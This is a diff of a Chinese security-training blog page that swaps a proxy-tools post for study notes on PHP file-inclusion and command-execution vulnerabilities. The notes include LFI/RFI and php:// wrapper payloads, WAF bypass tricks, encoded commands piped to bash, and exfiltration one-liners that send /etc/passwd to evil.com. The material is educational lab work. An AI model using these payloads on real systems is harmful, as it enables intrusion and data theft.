@@ -1,18 +1,18 @@
 <!DOCTYPE html>
 <html lang="en-us" dir="ltr">
     <head><meta charset='utf-8'>
-<meta name='viewport' content='width=device-width, initial-scale=1'><meta name='description' content="打开新世界">
-<title>魔法上网</title>
+<meta name='viewport' content='width=device-width, initial-scale=1'><meta name='description' content="文件包含漏洞 搭建靶场所用文件：https://pan.baidu.com/s/1IoX4I73J5mnD96tzlnV6UQ?pwd=s86q\n这部分在之前的【文件上传】当中已有运用，详情请看1.19 XSS 注入攻击2与文件上传\n文件包含在php中有两种写法：\ninclude\t出错但继续 require\t出错会停 include_once\t相当于include，但会检查确保只包含一次 require\t相当于require，但会检查确保只包含一次 本地包含（Local File Include） 在靶场中选择File Inclusion(local)选择一个选项后用burp抓包可以看见提交的数据包中第一行为：\n">
+<title>1.24-1 文件包含漏洞和命令执行漏洞</title>
 
-<link rel='canonical' href='https://www.retr0.xyz/p/%E9%AD%94%E6%B3%95%E4%B8%8A%E7%BD%91/'>
+<link rel='canonical' href='https://www.retr0.xyz/p/1.24-1-%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E6%BC%8F%E6%B4%9E%E5%92%8C%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/'>
 
-<link rel="stylesheet" href="/scss/style.min.67c2cdd23260c968137443c657d1f7a9a3df6cb47c832d8909e5b1c8880a7e9c.css"><meta property='og:title' content="魔法上网">
-<meta property='og:description' content="打开新世界">
-<meta property='og:url' content='https://www.retr0.xyz/p/%E9%AD%94%E6%B3%95%E4%B8%8A%E7%BD%91/'>
+<link rel="stylesheet" href="/scss/style.min.67c2cdd23260c968137443c657d1f7a9a3df6cb47c832d8909e5b1c8880a7e9c.css"><meta property='og:title' content="1.24-1 文件包含漏洞和命令执行漏洞">
+<meta property='og:description' content="文件包含漏洞 搭建靶场所用文件：https://pan.baidu.com/s/1IoX4I73J5mnD96tzlnV6UQ?pwd=s86q\n这部分在之前的【文件上传】当中已有运用，详情请看1.19 XSS 注入攻击2与文件上传\n文件包含在php中有两种写法：\ninclude\t出错但继续 require\t出错会停 include_once\t相当于include，但会检查确保只包含一次 require\t相当于require，但会检查确保只包含一次 本地包含（Local File Include） 在靶场中选择File Inclusion(local)选择一个选项后用burp抓包可以看见提交的数据包中第一行为：\n">
+<meta property='og:url' content='https://www.retr0.xyz/p/1.24-1-%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E6%BC%8F%E6%B4%9E%E5%92%8C%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/'>
 <meta property='og:site_name' content='Retr0的小窝'>
-<meta property='og:type' content='article'><meta property='article:section' content='Post' /><meta property='article:published_time' content='2025-10-27T22:41:59&#43;08:00'/><meta property='article:modified_time' content='2025-10-27T22:41:59&#43;08:00'/>
-<meta name="twitter:title" content="魔法上网">
-<meta name="twitter:description" content="打开新世界">
+<meta property='og:type' content='article'><meta property='article:section' content='Post' /><meta property='article:published_time' content='2026-01-24T20:58:21&#43;08:00'/><meta property='article:modified_time' content='2026-01-24T20:58:21&#43;08:00'/>
+<meta name="twitter:title" content="1.24-1 文件包含漏洞和命令执行漏洞">
+<meta name="twitter:description" content="文件包含漏洞 搭建靶场所用文件：https://pan.baidu.com/s/1IoX4I73J5mnD96tzlnV6UQ?pwd=s86q\n这部分在之前的【文件上传】当中已有运用，详情请看1.19 XSS 注入攻击2与文件上传\n文件包含在php中有两种写法：\ninclude\t出错但继续 require\t出错会停 include_once\t相当于include，但会检查确保只包含一次 require\t相当于require，但会检查确保只包含一次 本地包含（Local File Include） 在靶场中选择File Inclusion(local)选择一个选项后用burp抓包可以看见提交的数据包中第一行为：\n">
     <link rel="shortcut icon" href="/favicon.ico" />
 
         <link rel="stylesheet" href="/css/APlayer.min.css">
@@ -319,11 +319,61 @@
         <div class="widget--toc">
             <nav id="TableOfContents">
   <ol>
-    <li>
+    <li><a href="#文件包含漏洞">文件包含漏洞</a>
       <ol>
-        <li><a href="#代理工具">代理工具：</a></li>
-        <li><a href="#机场">机场：</a></li>
-        <li><a href="#起飞">起飞：</a></li>
+        <li><a href="#本地包含local-file-include">本地包含（Local File Include）</a></li>
+        <li><a href="#远程包含remote-file-include">远程包含（Remote File Include）</a></li>
+        <li><a href="#结合php伪协议">结合php伪协议</a>
+          <ol>
+            <li><a href="#phpfilter获取源码">php://filter（获取源码）</a></li>
+            <li><a href="#phpinput执行代码">php://input（执行代码）</a></li>
+            <li><a href="#phpfile使用绝对路径打开文件">php://file（使用绝对路径打开文件）</a></li>
+            <li><a href="#phpdata直接在url中写php代码">php://data（直接在URL中写php代码）</a></li>
+          </ol>
+        </li>
+      </ol>
+    </li>
+    <li><a href="#命令执行漏洞">命令执行漏洞</a>
+      <ol>
+        <li><a href="#危险函数盘点">危险函数盘点</a>
+          <ol>
+            <li><a href="#系统命令执行函数">系统命令执行函数</a></li>
+            <li><a href="#代码执行函数">代码执行函数</a></li>
+          </ol>
+        </li>
+        <li><a href="#漏洞模式分类含代码示例">漏洞模式分类（含代码示例）</a>
+          <ol>
+            <li><a href="#直接执行模式">直接执行模式</a></li>
+            <li><a href="#拼接执行模式">拼接执行模式</a></li>
+            <li><a href="#动态函数调用模式">动态函数调用模式</a></li>
+          </ol>
+        </li>
+        <li><a href="#命令执行绕过技术">命令执行绕过技术</a>
+          <ol>
+            <li><a href="#命令分隔符按系统分类">命令分隔符（按系统分类）</a></li>
+            <li><a href="#空格绕过">空格绕过</a></li>
+            <li><a href="#字符串混淆">字符串混淆</a></li>
+          </ol>
+        </li>
+        <li><a href="#编码绕过">编码绕过</a>
+          <ol>
+            <li><a href="#base64-编码适用于-waf-拦截关键字">Base64 编码（适用于 WAF 拦截关键字）</a></li>
+            <li><a href="#hex-编码">Hex 编码</a></li>
+          </ol>
+        </li>
+        <li><a href="#无回显攻击技术blind-command-execution">无回显攻击技术（Blind Command Execution）</a>
+          <ol>
+            <li><a href="#dns-外带oob">DNS 外带（OOB）</a></li>
+            <li><a href="#http-外带">HTTP 外带</a></li>
+            <li><a href="#时间盲注">时间盲注</a></li>
+          </ol>
+        </li>
+        <li><a href="#常用系统命令与替代方案">常用系统命令与替代方案</a>
+          <ol>
+            <li><a href="#基础命令按系统分类">基础命令（按系统分类）</a></li>
+            <li><a href="#关键词waf屏蔽绕过替代命令">关键词WAF屏蔽绕过（替代命令）</a></li>
+          </ol>
+        </li>
       </ol>
     </li>
   </ol>
@@ -344,8 +394,12 @@
     
     <header class="article-category">
         
-            <a href="/categories/%E6%9D%82%E9%A1%B9/" style="background-color: #40a070; color: #fff;">
-                杂项
+            <a href="/categories/%E7%BD%91%E5%AE%89/" style="background-color: #BEBDBD; color: #fff;">
+                网安
+            </a>
+        
+            <a href="/categories/26%E5%AF%92%E5%81%87%E9%9B%86%E8%AE%AD/" >
+                26寒假集训
             </a>
         
     </header>
@@ -353,13 +407,9 @@
 
     <div class="article-title-wrapper">
         <h2 class="article-title">
-            <a href="/p/%E9%AD%94%E6%B3%95%E4%B8%8A%E7%BD%91/">魔法上网</a>
+            <a href="/p/1.24-1-%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E6%BC%8F%E6%B4%9E%E5%92%8C%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/">1.24-1 文件包含漏洞和命令执行漏洞</a>
         </h2>
     
-        
-        <h3 class="article-subtitle">
-            打开新世界
-        </h3>
         
     </div>
 
@@ -379,7 +429,7 @@
   <path d="M3 11h16" />
   <path d="M18 16.496v1.504l1 1" />
 </svg>
-                <time class="article-time--published">2025-10-27</time>
+                <time class="article-time--published">2026-01-24</time>
             </div>
         
 
@@ -402,49 +452,293 @@
     <section class="article-content">
     
     
-    <h3 id="代理工具">代理工具：
-</h3><p>很久以前：</p>
-<p><strong>ShadowsocksR</strong> <strong>谁家文物</strong></p>
-<p><a class="link" href="https://github.com/ShadowsocksR-Live/ssrWin/releases"  target="_blank" rel="noopener"
-    >Releases · ShadowsocksR-Live/ssrWin</a></p>
-<p>现在主流：</p>
-<p><strong>v2rayN 支持vmess格式</strong></p>
-<p><a class="link" href="https://github.com/2dust/v2rayN?search=1"  target="_blank" rel="noopener"
-    >v2rayN/ at master · 2dust/v2rayN</a></p>
-<p><strong>clash 最全能</strong></p>
-<p><a class="link" href="https://github.com/clash-version/clash-download"  target="_blank" rel="noopener"
-    >GitHub - clash-version/clash-download: Clash 下载|持续收藏CLash版本|2025年8月更新</a></p>
-<p>目前自用</p>
-<p><a class="link" href="https://github.com/chen08209/FlClash"  target="_blank" rel="noopener"
-    >GitHub - chen08209/FlClash: A multi-platform proxy client based on ClashMeta,simple and easy to use, open-source and ad-free.</a></p>
-<p>备用方案：</p>
-<p>去tg上找破解vpn</p>
-<h3 id="机场">机场：
-</h3><p>GitHub推荐列表</p>
-<p><a class="link" href="https://github.com/yonghumeijj/jichang"  target="_blank" rel="noopener"
-    >GitHub - yonghumeijj/jichang: 2025年最新性价比机场推荐VPN、翻墙🚀推荐稳定性高，适合各类人需求的机场</a></p>
-<p>目前自用</p>
-<p><a class="link" href="https://yiyuan.co"  target="_blank" rel="noopener"
-    >一元机场</a>（一月一块，包年12）</p>
-<p>备选方案：</p>
-<p>海外VPS自己部署 （不推荐）</p>
-<h3 id="起飞">起飞：
-</h3><ul>
-<li>选择合适的套餐订阅后在帮助文档中使用一键导入按钮导入节点</li>
-<li>测试真延迟并选择延迟最低节点</li>
-<li>芜湖起飞</li>
+    <h2 id="文件包含漏洞">文件包含漏洞
+</h2><p>搭建靶场所用文件：<a class="link" href="https://pan.baidu.com/s/1IoX4I73J5mnD96tzlnV6UQ?pwd=s86q"  target="_blank" rel="noopener"
+    >https://pan.baidu.com/s/1IoX4I73J5mnD96tzlnV6UQ?pwd=s86q</a></p>
+<p>这部分在之前的【文件上传】当中已有运用，详情请看<a class="link" href="https://www.retr0.xyz/p/1.19-xss-%E6%B3%A8%E5%85%A5%E6%94%BB%E5%87%BB2%E4%B8%8E%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/"  target="_blank" rel="noopener"
+    >1.19 XSS 注入攻击2与文件上传</a></p>
+<p>文件包含在php中有两种写法：</p>
+<ul>
+<li><code>include</code>	出错但继续</li>
+<li><code>require</code>	出错会停</li>
+<li><code>include_once</code>	相当于include，但会检查确保只包含一次</li>
+<li><code>require</code>		相当于require，但会检查确保只包含一次</li>
 </ul>
-<blockquote>
-<p>孩子们，P站并不好看。</p>
+<h3 id="本地包含local-file-include">本地包含（Local File Include）
+</h3><p>在靶场中选择File Inclusion(local)选择一个选项后用burp抓包可以看见提交的数据包中第一行为：</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-http" data-lang="http"><span class="line"><span class="cl"><span class="nf">GET</span> <span class="nn">/vul/fileinclude/fi_local.php?filename=file1.php&amp;submit=%E6%8F%90%E4%BA%A4%E6%9F%A5%E8%AF%A2</span> <span class="kr">HTTP</span><span class="o">/</span><span class="m">1.1</span>
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>这里作者已经帮我们在网站根目录的test文件夹里放了一个<code>phpinfo.txt</code>我们需要使用调用它。</p>
+<p>因为默认情况下这里路径指的是<code>\vul\fileinclude\include</code>文件夹，所以我们要在路径前面写<code>../</code>来回退到上一个目录</p>
+<p>最终的filename是<code>../../../test/phpinfo.txt</code>使用了三次回退正好回退到了根目录</p>
+<p><strong>注：</strong> 有些情况下(PHP&lt;5.3.4)filename最后可能需要使用<code>%00</code>截断</p>
+<h3 id="远程包含remote-file-include">远程包含（Remote File Include）
+</h3><p>测试远程文件包含可以用准备好的phpinfo文件：<a class="link" href="http://www.retr0.xyz/blog-files/phpinfo.txt"  target="_blank" rel="noopener"
+    >http://www.retr0.xyz/blog-files/phpinfo.txt</a></p>
+<p>同样提交时使用burp抓包，第一行为：</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-http" data-lang="http"><span class="line"><span class="cl"><span class="nf">GET</span> <span class="nn">/vul/fileinclude/fi_remote.php?filename=include%2Ffile1.php&amp;submit=%E6%8F%90%E4%BA%A4%E6%9F%A5%E8%AF%A2</span> <span class="kr">HTTP</span><span class="o">/</span><span class="m">1.1</span>
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>这里比较简单，因为include函数是放在数据包里的，所以我们直接把原本的<code>filename</code>替换成远程木马的链接就可以了，例如：</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-http" data-lang="http"><span class="line"><span class="cl"><span class="err">filename=http://www.retr0.xyz/blog-files/phpinfo.txt
+</span></span></span></code></pre></td></tr></table>
+</div>
+</div><p>有时<code>http://</code>协议异常时也可以试试<code>ftp://</code></p>
+<p>一般情况下远程文件包含不会像这样简单，因为需要服务端配置了以下环境（php.ini）:</p>
+<ul>
+<li><code>allow_url_fopen = On</code></li>
+<li><code>allow_url_include = On</code></li>
+</ul>
+<h3 id="结合php伪协议">结合php伪协议
+</h3><h4 id="phpfilter获取源码">php://filter（获取源码）
+</h4><ol>
+<li><strong>适用场景</strong></li>
+</ol>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-plain" data-lang="plain"><span class="line"><span class="cl">include($_GET[&#39;file&#39;]);
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>并且：</p>
+<ul>
+<li><code>allow_url_include</code> ❌ 无要求</li>
+<li><code>php://filter</code> 默认开启</li>
+</ul>
+<hr>
+<ol start="2">
+<li><strong>利用方式</strong></li>
+</ol>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-plain" data-lang="plain"><span class="line"><span class="cl">?filename=php://filter/read=convert.base64-encode/resource=index.php
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>此外也有：</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-plain" data-lang="plain"><span class="line"><span class="cl">?filename=php://filter/read=string.toupper|string.rot13/resource=index.php
+</span></span></code></pre></td></tr></table>
+</div>
+</div><h4 id="phpinput执行代码">php://input（执行代码）
+</h4><blockquote>
+<p>php://input会让服务端将你传的php代码当作一个临时的php文件运行。</p>
 </blockquote>
-<p><img src="/post/%e6%9d%82%e9%a1%b9/%e7%89%a2%e5%a4%a7.webp"
-	
-	
-	
-	loading="lazy"
-	
-	
-></p>
+<p><strong>使用方法：</strong></p>
+<p>向目标参数传入<code>php://input</code>，如：</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-plain" data-lang="plain"><span class="line"><span class="cl">http://target/vuln.php?filename=php://input
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>同时用POST方式传入你的一句话木马：</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-plain" data-lang="plain"><span class="line"><span class="cl">&lt;?php phpinfo(); ?&gt;
+</span></span></code></pre></td></tr></table>
+</div>
+</div><h4 id="phpfile使用绝对路径打开文件">php://file（使用绝对路径打开文件）
+</h4><p><strong>使用方法：</strong></p>
+<p>修改目标参数为：</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-plain" data-lang="plain"><span class="line"><span class="cl">filename=file:绝对路径
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>如：<code>filename=file:///etc/passwd</code></p>
+<p>或：<code>filename=file:///C:/windows/</code></p>
+<h4 id="phpdata直接在url中写php代码">php://data（直接在URL中写php代码）
+</h4><p><strong>使用方法：</strong></p>
+<p>修改目标参数为：</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-plain" data-lang="plain"><span class="line"><span class="cl">filename-data://text/plain,&lt;?php phpinfo();?&gt;
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>或者使用base64加密版（不要带加号）</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-plain" data-lang="plain"><span class="line"><span class="cl">filename=data://text/plain;base64,PD9waHAgcGhwaW5mbygpOz8%2b 
+</span></span></code></pre></td></tr></table>
+</div>
+</div><h2 id="命令执行漏洞">命令执行漏洞
+</h2><p>命令执行在之前的<a class="link" href="https://www.retr0.xyz/p/1.6-%E5%85%B6%E4%BB%96%E5%9F%BA%E7%A1%80web%E6%BC%8F%E6%B4%9E%E4%BB%8B%E7%BB%8D/"  target="_blank" rel="noopener"
+    >1.6 其他基础web漏洞介绍</a>有过简单介绍，在这里再来总结补充一下。</p>
+<blockquote>
+<p>例如一个网页上让你输入一个ip，提交后会返回ping这个ip的结果，那么我们要想这个ping的执行是否是由系统命令直接执行的（cmd或bash），如果是那么如何让它执行别的命令？</p>
+</blockquote>
+<h3 id="危险函数盘点">危险函数盘点
+</h3><h4 id="系统命令执行函数">系统命令执行函数
+</h4><ul>
+<li><code>system()</code></li>
+<li><code>shell_exec()</code></li>
+<li><code>popen()</code></li>
+<li><code>exec()</code></li>
+<li><code>passthru()</code></li>
+<li><code>proc_open()</code></li>
+<li>反引号 <code>command</code>（等效于 shell_exec ()）</li>
+</ul>
+<h4 id="代码执行函数">代码执行函数
+</h4><ul>
+<li><code>eval()</code></li>
+<li><code>create_function()</code></li>
+<li><code>assert()</code></li>
+<li><code>preg_replace ('/e')</code>（正则替换 /e 修饰符触发代码执行）</li>
+</ul>
+<h3 id="漏洞模式分类含代码示例">漏洞模式分类（含代码示例）
+</h3><h4 id="直接执行模式">直接执行模式
+</h4><ul>
+<li>核心特征：用户输入直接作为命令执行参数</li>
+<li>示例代码：<code>system($_GET['cmd']);</code></li>
+<li>攻击逻辑：输入的 cmd 参数无过滤，直接触发命令执行</li>
+</ul>
+<h4 id="拼接执行模式">拼接执行模式
+</h4><ul>
+<li>核心特征：用户输入与固定命令拼接后执行</li>
+<li>示例代码：<code>$ip = $_GET['ip']; system(&quot;ping -c 4 &quot; . $ip);</code></li>
+<li>攻击逻辑：通过拼接分隔符（如；、|）注入额外命令</li>
+</ul>
+<h4 id="动态函数调用模式">动态函数调用模式
+</h4><ul>
+<li>核心特征：用户输入作为函数名调用</li>
+<li>示例代码：<code>$func = $_GET['func']; $func();</code></li>
+<li>攻击逻辑：输入危险函数名（如 system）触发执行</li>
+</ul>
+<h3 id="命令执行绕过技术">命令执行绕过技术
+</h3><h4 id="命令分隔符按系统分类">命令分隔符（按系统分类）
+</h4><ol>
+<li><strong>Linux 系统</strong></li>
+</ol>
+<ul>
+<li>分号 <code>;</code>：顺序执行多个命令（command1; command2）</li>
+<li>管道 <code>|</code>：将前命令结果传递给后命令（command1 | command2）</li>
+<li>逻辑运算符：
+<ul>
+<li><code>&amp;&amp;</code>：前命令成功则执行后命令（command1 &amp;&amp; command2）</li>
+<li><code>||</code>：前命令失败则执行后命令（command1 || command2）</li>
+</ul>
+</li>
+<li>后台执行 <code>&amp;</code>：同时执行多个命令（command1 &amp; command2）</li>
+<li>换行符 <code>0x0a</code>：换行分隔命令（command1 0x0a command2）</li>
+<li>子 shell：<code>$(command1)</code> 或 <code>\</code>command1``（执行子 shell 命令）</li>
+</ul>
+<ol start="2">
+<li><strong>Windows 系统</strong></li>
+</ol>
+<ul>
+<li>顺序执行 <code>&amp;</code>：command1 &amp; command2</li>
+<li>逻辑运算符：<code>&amp;&amp;</code>（前成功则后执行）、<code>||</code>（前失败则后执行）</li>
+<li>管道 <code>|</code>：command1 | command2</li>
+</ul>
+<h4 id="空格绕过">空格绕过
+</h4><ul>
+<li><code>$IFS</code>：<code>cat${IFS}/etc/passwd</code></li>
+<li>大括号 <code>{}</code>：<code>{cat,/etc/passwd}</code></li>
+<li>重定向符号：<code>cat&lt;/etc/passwd</code></li>
+<li>Hex 编码：<code>X=$'cat\x09/etc/passwd'&amp;&amp;$X</code>（\x09 为 Tab 字符）</li>
+</ul>
+<h4 id="字符串混淆">字符串混淆
+</h4><ul>
+<li>变量拼接：<code>a=c;b=at;c=/etc/passwd;$a$b $c</code></li>
+<li>通配符替代：<code>/bin/cat /etc/pass[d]</code>、<code>/???/c?t /etc/passwd</code></li>
+<li>引号混淆：<code>c'a't</code>、<code>c&quot;a&quot;t</code>、<code>c\at</code></li>
+<li>特殊符号绕过：<code>l's'</code>（绕过 ls 关键词屏蔽）、<code>chmo\d</code>（绕过 chmod 屏蔽）</li>
+</ul>
+<h3 id="编码绕过">编码绕过
+</h3><h4 id="base64-编码适用于-waf-拦截关键字">Base64 编码（适用于 WAF 拦截关键字）
+</h4><ul>
+<li>示例：将<code>cat /etc/passwd</code>编码为<code>Y2F0IC9ldGMvcGFzc3dk</code></li>
+<li>执行命令：<code>echo Y2F0IC9ldGMvcGFzc3dk | base64 -d | bash</code></li>
+</ul>
+<h4 id="hex-编码">Hex 编码
+</h4><ul>
+<li>示例：将<code>cat /etc/passwd</code>编码为<code>636174202f6574632f706173737764</code></li>
+<li>执行命令：<code>echo 636174202f6574632f706173737764 | xxd -r -p | bash</code></li>
+</ul>
+<h3 id="无回显攻击技术blind-command-execution">无回显攻击技术（Blind Command Execution）
+</h3><h4 id="dns-外带oob">DNS 外带（OOB）
+</h4><ul>
+<li>原理：将命令执行结果作为子域名发送到攻击者 DNS 服务器</li>
+<li>示例：<code>ping 反引号whoami反引号.evil.sh</code></li>
+</ul>
+<p>详见：<a class="link" href="https://www.retr0.xyz/p/1.22.sp-%E5%A5%87%E6%8A%80%E6%B7%AB%E5%B7%A7sql%E6%B3%A8%E5%85%A5%E4%B9%8B%E6%95%B0%E6%8D%AE%E5%A4%96%E5%B8%A6/"  target="_blank" rel="noopener"
+    >1.22.SP 奇技淫巧：SQL注入之数据外带</a></p>
+<h4 id="http-外带">HTTP 外带
+</h4><ul>
+<li>原理：通过 HTTP 请求将结果发送到攻击者服务器</li>
+<li>示例：<code>curl http://evil.com/$(cat /etc/passwd|base64)</code></li>
+<li>进阶：带认证 + 数据编码 <code>curl -u user:pass http://evil.com/$(whoami|base64) -d &quot;data=$(cat /etc/passwd|base64)&quot;</code></li>
+</ul>
+<h4 id="时间盲注">时间盲注
+</h4><ul>
+<li>原理：通过命令执行后的延迟判断是否成功</li>
+<li>示例：<code>sleep 5</code>（Linux）、<code>ping -c 10 127.0.0.1</code>（Linux）</li>
+</ul>
+<h3 id="常用系统命令与替代方案">常用系统命令与替代方案
+</h3><h4 id="基础命令按系统分类">基础命令（按系统分类）
+</h4><ol>
+<li><strong>Linux</strong></li>
+</ol>
+<ul>
+<li>查看目录：ls</li>
+<li>读取文件：cat、tac、head、tail、more、less、nl、sort、paste</li>
+<li>系统信息：pwd、whoami、chmod</li>
+<li>路径格式：<code>/etc/passwd</code>、<code>./haha.php</code></li>
+</ul>
+<ol start="2">
+<li><strong>Windows</strong></li>
+</ol>
+<ul>
+<li>系统信息：whoami、ipconfig</li>
+<li>查看目录：dir</li>
+<li>读取文件：type</li>
+<li>路径格式：<code>c:/a.txt</code>、<code>c:\a.txt</code></li>
+</ul>
+<h4 id="关键词waf屏蔽绕过替代命令">关键词WAF屏蔽绕过（替代命令）
+</h4><ul>
+<li>屏蔽 cat：使用 tac、more、less、head、tail、nl、sort、paste</li>
+<li>屏蔽 ls：使用<code>l's'</code>、<code>ls</code>的通配符替代</li>
+<li>屏蔽 php：使用通配符<code>./haha.ph*</code>、<code>./haha.ph?</code></li>
+</ul>
 
 </section>
 
@@ -507,50 +801,64 @@
             
                 
 <article class="">
-    <a href="/p/%E8%A3%85%E6%9C%BA%E6%B3%9540%E6%9D%A1-laws-for-computer-assembly/">
+    <a href="/p/1.23-sql%E6%B3%A8%E5%85%A5%E7%B3%BB%E5%88%97-3/">
         
         
 
         <div class="article-details">
-            <h2 class="article-title">装机法40条 (Laws for Computer Assembly)</h2>
+            <h2 class="article-title">1.23 SQL注入系列-3</h2>
         </div>
     </a>
 </article>
 
             
                 
-<article class="has-image">
-    <a href="/p/%E5%85%8D%E8%B4%B9%E4%BF%9D%E5%A7%86%E7%BA%A7%E6%95%99%E7%A8%8B%E5%9F%BA%E4%BA%8E%E4%BA%91%E6%9C%8D%E5%8A%A1%E5%99%A8/%E4%BA%91%E7%94%B5%E8%84%91%E7%9A%84%E5%85%A8%E8%87%AA%E5%8A%A8%E5%88%B7%E8%AF%BE%E5%B9%B3%E5%8F%B0/">
+<article class="">
+    <a href="/p/1.22-sql%E6%B3%A8%E5%85%A5%E7%B3%BB%E5%88%97-2/">
         
-        
-            <div class="article-image">
-                
-                    <img src="https://img1.dancihu.com/2023-10-31/a116a2e0-4624-8c67-900f-7e6165b9012f.jpg" loading="lazy" data-key="" data-hash="https://img1.dancihu.com/2023-10-31/a116a2e0-4624-8c67-900f-7e6165b9012f.jpg"/>
-                
-            </div>
         
 
         <div class="article-details">
-            <h2 class="article-title">[免费]保姆级教程：基于云服务器/云电脑的全自动刷课平台</h2>
+            <h2 class="article-title">1.22 SQL注入系列-2</h2>
         </div>
     </a>
 </article>
 
             
                 
-<article class="has-image">
-    <a href="/p/%E5%9B%9E%E5%BF%86%E5%8B%92%E7%B4%A2%E7%97%85%E6%AF%92wannacry%E6%B7%B1%E5%BA%A6%E5%89%96%E6%9E%90/">
+<article class="">
+    <a href="/p/1.22.sp-%E5%A5%87%E6%8A%80%E6%B7%AB%E5%B7%A7sql%E6%B3%A8%E5%85%A5%E4%B9%8B%E6%95%B0%E6%8D%AE%E5%A4%96%E5%B8%A6/">
         
-        
-            <div class="article-image">
-                
-                    <img src="https://s.secrss.com/anquanneican/eba6dc46083f85d24ac9474fa735590a.jpg" loading="lazy" data-key="" data-hash="https://s.secrss.com/anquanneican/eba6dc46083f85d24ac9474fa735590a.jpg"/>
-                
-            </div>
         
 
         <div class="article-details">
-            <h2 class="article-title">回忆勒索病毒WannaCry：深度剖析</h2>
+            <h2 class="article-title">1.22.SP 奇技淫巧：SQL注入之数据外带</h2>
+        </div>
+    </a>
+</article>
+
+            
+                
+<article class="">
+    <a href="/p/1.21-webshell-%E5%85%8D%E6%9D%80%E5%92%8C%E6%AD%A3%E5%88%99%E8%A1%A8%E8%BE%BE%E5%BC%8F/">
+        
+        
+
+        <div class="article-details">
+            <h2 class="article-title">1.21 Webshell 免杀和正则表达式</h2>
+        </div>
+    </a>
+</article>
+
+            
+                
+<article class="">
+    <a href="/p/1.19-xss-%E6%B3%A8%E5%85%A5%E6%94%BB%E5%87%BB2%E4%B8%8E%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/">
+        
+        
+
+        <div class="article-details">
+            <h2 class="article-title">1.19 XSS 注入攻击2与文件上传</h2>
         </div>
     </a>
 </article>
